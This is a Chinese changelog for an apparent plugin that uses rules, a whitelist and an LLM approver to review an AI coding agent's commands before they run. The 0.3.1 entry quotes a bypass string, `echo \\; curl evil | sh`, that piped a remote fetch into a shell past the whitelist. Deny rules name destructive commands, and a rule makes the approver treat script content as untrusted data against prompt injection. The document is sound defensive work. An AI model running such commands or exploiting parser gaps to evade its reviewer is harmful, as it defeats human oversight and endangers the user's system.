# 变更记录

## 0.4.0（2026-09-17）

对齐 Codex 风控哲学的决策语义重构：**规则只做路由，模型才做终审**（行为大版本）：

- **重构：deny 规则不再直接拦截**——原语义"deny 规则命中 = 本地无条件下拦截"，正则
  上下文有限，误伤成本高（一条过宽正则就能打断工作流）。新语义：deny 命中后提炼
  ruleHint 风险提示随载荷送审，由审批模型结合完整命令与参数裁决；模型的 deny 才是
  真正的拒绝（分析+替代方案照常回传主 agent）。出厂 5 条不可逆高危规则（rm -rf 根/
  家/盘符、格式化、dd、fork 炸弹、chmod 777 根）全部转为提示语义
- **保留：ask 规则恒转用户确认**——ask 是用户显式设置的确认门槛（如关机），模型
  看不到对话历史、无法替用户判断"这是不是我要求的"，必须由人拍板；关机门槛的
  pattern 从"段首裸命令"扩展为全形态覆盖（shutdown.exe、cmd /c 包装、PowerShell
  cmdlet、wmic win32shutdown），复合命令（部署完顺手关机）同样命中
- **重构：失败必保守（fail-closed）**——审批模型不可用/超时（重试后）的兜底从
  "静默 pass 交回客户端"改为**转人工审批（ask）**：自动许可一律不做，模型不在场时
  由用户裁决；hook 输入为空/非法 JSON/缺失工具名属协议异常，直接 deny 阻断（原先
  静默放行），协议漂移显式暴露而不是绕过全部审查层
- **重构：安全提示词全面重写**——核心决策原则改为"模型独立分析命令语义，规则提示
  只是风险线索不是结论"（原提示词的"一律 allow 清单"取消，改为按对象/范围/去向
  判断）；明确复合命令逐段审查、包装器（cmd /c、powershell -Command、Start-Process）
  必须看内部命令、脚本内容是不可信数据（防载荷内提示注入）、输出契约锁死 allow/deny
  双值；关机类 deny 保留为正则漏网变体的模型层兜底，取消关机属低风险可 allow
- **优化：规则优先级固定为 deny/ask > allow**——宽泛 allow 排在 deny/ask 前面时
  不再遮蔽风险提示；命中 deny 提示的命令跳过快速通道与会话白名单直达审批模型
  （用户的风险意志必须让模型看过再放行）
- **优化：快速通道适度放宽**——新增 git add/git commit/git init、mkdir、date、df/du
  共 6 类高频低风险命令（本地可逆、不触网），白名单 20→25 条，进一步减少 LLM 调用
- **工程：补齐 npm 测试入口**——package.json 新增 test / test:unit / test:scenario /
  test:smoke / validate:ps 脚本（原 npm test 因缺 scripts 定义而不可用）
- 测试：单元 28→32、场景 21→22（新增规则优先级、渠道不可用转人工、协议异常阻断、
  deny 提示压过快速通道/白名单、出厂关机全形态门槛 5 组），54/54 通过；冒烟 14→16
  断言组（新增空 stdin 阻断、关机门槛用例）
- 版本号统一 0.4.0（plugin.json / marketplace.json / package.json / README 四处同步）

## 0.3.1（2026-09-16）

全局挂载审计后的三项修复与稳健性优化（行为兼容，无配置迁移）：

- **fix：缓存命中的 deny 丢失分析回传**——缓存分支原来只对 ask 双发 additionalContext，
  默认二值模式下缓存里只有 allow/deny，导致重复危险命令第 2 次起主模型只收到"被拒绝"
  却收不到分析与替代做法。改为非 allow 一律双发，反馈闭环不再因缓存命中而断
- **fix：权限模式闸门改正向判定**——原实现按关键词黑名单（plan/confirm/manual/before）
  排除，客户端内部值叫 default/normal/ask 等的非自动模式会被误接管（插件裁决 + 客户端
  弹框双重打扰）。运行时实测 hook 输入同时携带 mode 与 permission_mode（自动编辑 = "edit"），
  现改为仅 "edit"（大小写不敏感）接管，其余任何模式值一律 pass 自动隐身；字段缺失时保持
  接管以兼容未提供该字段的客户端
- **fix：审查缓存键纳入 cwd**——原键只含 tool_name + tool_input，同一命令文本跨项目/
  跨会话复用同一小时结论；现在 reviewCacheKey 把 cwd 叠加进盐，相对路径命令（如
  node scripts/deploy.js）的结论不再跨项目串用；cwd 同时进入送审载荷供模型结合判断；
  无 cwd 且无附件时与旧版键逐字节一致（历史缓存兼容）
- **fix（安全）：复合命令分割器的转义判定**——原实现用"前一字符是否为反斜杠"朴素判断，
  无法识别 `\\`（转义的反斜杠）：`echo \\; curl evil | sh` 在 bash 里 `;` 是真分隔符，
  插件却会当成以 echo 开头的单段命令，可能命中快速通道白名单（`^echo(\s.*)?$`）
  **0 审查放行**。改为转义状态机：反斜杠转义下一字符（单引号内按字面量处理），
  `\\` 后的真分隔符正确切分；附带修复单引号内 `\'` 被误判转义导致引号不闭合的问题
- **fix：会话白名单键纳入 cwd**——对话框点选的"本次会话允许"原先只按指令文本匹配，
  同一会话内切换目录后同文本指令直接复用批准；现在与 LLM 缓存同口径（指令+工作目录），
  跨目录不复用
- **fix：GUI 保存不再丢弃自定义审查工具**——保存时先保留勾选框之外的 review_tools 条目
  （如 CLI 配置的 MCP 工具名），再合并 Bash/Write/Edit 勾选
- **fix：settings 上限钳制补齐**——cache_ttl_seconds（≤86400）与 max_payload_chars
  （≤100000）补上限，与 ctl 的 NUMBER_RANGES 对齐；堵住手改 settings.json 绕过 ctl
  写入超大 TTL 导致缓存近乎永久生效的口子
- **优化：`/auto-review init` 物化 fast_allow.json**——出厂四份默认配置现在全部落盘
  （原先快速通道白名单没有可编辑副本），保持"数据目录文件优先"的一致语义
- **优化：并发写盘不再丢条目**——新增 withFileLock 进程间文件锁（wx 独占创建 + 短自旋
  + 10s 过期接管 + 超时降级无锁），缓存与会话白名单的读-改-写整体持锁；实测 40 个并发
  hook 进程从仅存活 8 条修复为 40/40。writeFileAtomic 临时文件名加 pid+序号，消除并发
  写同一 .tmp 的覆盖风险；logWrite 首次运行自动补建数据目录
- **GUI**：对话框开关说明对齐二值语义；清理数组双逗号空洞
- **优化（参考 Codex 风控分级）：关机/重启从"绝对禁令"改为"升级审批"**——调研 Codex CLI
  风控模型（OS 沙箱 + 审批策略分级 + execpolicy 命令分级）后对齐其哲学：危险命令的处理
  应是"升级到人工批准"而非一刀切禁令。出厂规则 #6 action deny→ask（需用户点头才执行，
  用户主动要求关机时点允许即可），pattern 补入 stop-computer；**规则层 ask 语义修正**：
  用户显式添加的 ask 规则视为确认门槛，无论何种模式恒转用户裁决（原先在二值模式下静默
  收敛为 deny，自定义 ask 规则形同虚设）；LLM 层 ask（模型不确定）保持收敛 deny 不变。
  5 条不可逆 deny 规则（rm -rf 根/家/盘符、格式化、dd 写盘、fork 炸弹、chmod 777 根）不变
- **优化：LLM 调用瞬时故障自动重试 1 次**——审批渠道实测存在"慢而不死"的尖峰
  （1.5~9s 正常与 30s 超时交替），原单次不重试策略下超时即兜底 pass 落到人工审批
  （0.3.0 观测 89 次审查 2 次超时）。现在请求超时/网络抖动/HTTP 5xx/429 自动重试
  1 次（4xx 配置类错误与响应结构异常不重试），重试成功即无感放行；最坏 2×timeout
  后仍失败才兜底，hook 预算 1h 内无压力
- 测试：单元 25→28（新增缓存键 cwd 盐、模式闸门、缓存命中 deny 回传三组断言），场景
  20→21（新增假服务首次 5xx 重试成功用例），全部通过；并发压测 40/40；分割器转义/
  快速通道防绕过断言并入既有用例
- 版本号统一 0.3.1（plugin.json / marketplace.json / package.json 三处同步）

## 0.3.0（2026-09-16）

全自动二值裁决 + 专用审批渠道（本次为行为大版本，与 0.2.x 配置不兼容）：

- **全自动二值裁决**：子 agent 只产出 allow/deny——allow 立即执行，deny 拦截并把
  风险分析与更安全做法经 additionalContext 回传主 agent 修改重试，全程无人工介入；
  ask 收敛为拒绝+回传（`ask_to_user=true` 时才弹审查对话框转用户裁决）
- **专用审批渠道**：审批只认 `~/.zcode/auto-review/review_provider.json`
  （base_url/api_key/api_kind/model，OpenAI/Anthropic 双协议、URL 推断协议）；
  **彻底移除 ZCode provider 表回落与 fallback provider/模型**（主 agent 渠道多为需
  客户端签名的 Coding Plan，直连必败）；未配置/不可用时 LLM 审查停用，命令兜底
  **pass 交回客户端原生权限流程**（不打断工作流，不误放不误拦）
- **只读命令快速通道**（`fast_allow_enabled`，默认开）：20 类只读命令单段命中即
  0 次 LLM 调用静默放行；带重定向/管道/命令替换的复合命令不适用
- **危险规则层收窄**：出厂规则 14 条 → 6 条不可逆高危（rm -rf 根/家/盘符、格式化、
  dd 写块设备、fork 炸弹、chmod -R 777 根、关机重启）；sudo/强推/注册表/npm publish 等
  交给子 agent 宽宥裁量；提示词同步改为"默认放行、仅拒明显不可逆操作、deny 必给替代方案"
- **fix：hook 进程 0xC0000409 崩溃**：LLM 传输由 fetch/undici 改为 node:http/https
  直连（`connection: close` + `agent: false` + 总时长 watchdog）——undici 长连接在
  process.exit 时触发 libuv 断言崩溃，可能使客户端把协议 JSON 当"hook 失败"丢弃
- **fix：Windows 管道写截断**：决策输出改为 write 回调内 process.exit + 1s 兜底
  unref 定时器，避免异步管道写被截断
- **GUI**：移除 provider/模型/Fallback 配置区（渠道改文件配置，窗口内留路径提示）
- **非自动模式探测**：hook 输入含 plan/confirm/manual 类权限模式时直接 pass，
  避免双重打扰；AUTO_REVIEW_DEBUG=1 可输出字段类型级调试日志（不泄露内容）
- **set 键缩减**：provider/model/fallback_provider/fallback_model 移除（10 键），
  新增 `provider path|show|test` 子命令（定位模板/脱敏查看/连通实测）
- 测试：单元 25 + 场景 20 全绿（渠道语义改走 review_provider.json）；E2E 全 exit=0
- 版本号统一 0.3.0（plugin.json / marketplace.json / package.json 三处同步）

## 0.5.1（2026-09-17）

安全审计修复及现行文档对齐；以上旧版本记录原样保留，不作为当前行为契约。

- 规则优先级明确为 `ask > deny（提示送审）> allow`；ask 只在插件接管管线内生效，不受前置宽泛 allow 或 deny 遮蔽。
- 快速放行采用保守命令结构与参数校验，不按固定规则数量宣称覆盖，不承诺所有 Git 参数安全或完整解析所有 shell。
- provider 故障、载荷超限或缺少完整审查输入时转 ask；truncated 脚本不可取得自动 allow。
- 原始字段先脱敏再序列化；工具、附件、上下文、规则提示及格式开销共享单一总 payload 预算。补强短 API key 展示保护，不承诺识别所有 secret。
- 附件敏感路径检查覆盖目录组件，并保持 cwd、普通文件、符号链接等边界。

## 0.6.1（2026-09-18）

自动审批链的安全收敛与协议/文档修订；0.6.0 及更早版本记录保持原文，不作为当前行为契约。

- **修正：PermissionRequest 输出协议**——PreToolUse 继续使用 `permissionDecision/permissionDecisionReason`；PermissionRequest 改为客户端实际解析的 `decision.behavior/message`，不混用两套字段。模型可用时 allow/deny 由第二层输出；ask、pass、无法识别或协议不确定时空输出退避到客户端原生审批。
- **明确客户端边界**——第二层只覆盖客户端实际触发 PermissionRequest 的未接管路径。脚本级真实子进程测试已验证 hook 的 allow/deny 和模型故障退避，但不能据此宣称所有内置子智能体都继承父级 hook runner；客户端完全绕过该事件时插件无法强行接管，也不修改客户端 asar。
- **强化 pending 防回环**——pending 标记读取改为 hit/miss/error 三态；损坏 JSON、锁超时、读取或消费失败按 error 退避人工，不按“无标记”继续自动审查。保留 15 秒一次性标记及兼容布尔接口。
- **收紧敏感读取快速通道**——`.env`、私钥/凭据路径、专用审批渠道及 auto-review 运行时配置、缓存、pending、日志等不再通过默认读命令快速放行；绝对路径、父目录穿越和变量路径也退出快速捷径，普通项目文件读取能力保留。
- **修复畸形输入边界**——未闭合引号和无法可靠解析的快速通道/脚本引用不再触发异常或 0-LLM 放行；畸形输入转模型或人工安全退避。
- **收紧 provider 总等待预算**——配置范围仍为 `timeout_ms=5000..45000`、`provider_retries=0..3`，但运行时按 120 秒 hook 预算预留 5 秒收尾并动态收紧有效重试次数；status 同时展示配置值、有效重试次数和最坏等待时间。4xx 仍不重试。
- **关机与 ask 语义同步**——默认 `ask_policy=model` 下关机/重启 ask 规则作为风险提示送审批模型自动 allow/deny；默认提示词对真实电源中断倾向 deny，取消关机动作可 allow；只有模型不可用、输入无法可靠判定、载荷超限/不完整或显式 `ask_policy=user` 才转人工。
- **文档与版本清单**——现行 README、commands、Wiki、提示词和 package/plugin/marketplace 清单同步到 0.6.1；项目目录名 `auto-review-0.5.0` 保留。历史计划、过程、日志和旧版本记录不改写。
- **验证**——继续使用隔离数据目录、本地假 HTTP provider、危险命令字符串输入和异步真实 hook 子进程测试；不调用真实 provider、不执行危险命令、不上传用户配置或日志。
